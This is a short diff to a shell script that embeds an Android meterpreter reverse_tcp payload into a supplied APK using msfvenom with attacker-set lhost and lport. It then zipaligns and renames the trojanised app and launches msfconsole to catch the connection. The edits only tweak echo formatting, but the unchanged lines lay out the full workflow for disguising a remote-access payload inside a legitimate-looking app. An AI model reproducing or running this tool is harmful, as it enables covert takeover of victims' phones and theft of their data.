@@ -26,13 +26,13 @@ echo -e "\e[31m[*]Reverse Engineering Started..;p\e[0m"
 msfvenom -x $path -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport R> binded.apk
 
 #Signing the apk
-echo "\e[31m                                                   \e[2m"
-echo -e " [-]signing the apk                             "
+echo -e "\e[31m                                                 \e[2m"
+echo -e "[-]Signing the apk                             "
 zipalign -v 4 binded.apk binded-signed.apk
 
 #listner start
 rm binded.apk && mv binded-signed.apk $payload.apk
-echo "\e[34m                                                \e[2m"
+echo -e "\e[34m                                                \e[2m";
 read -p "[-]Start listner(Enter) or Close (Ctrl+c) : " listner
 msfconsole
 #Changing this banner doesn't make you programmer..!"
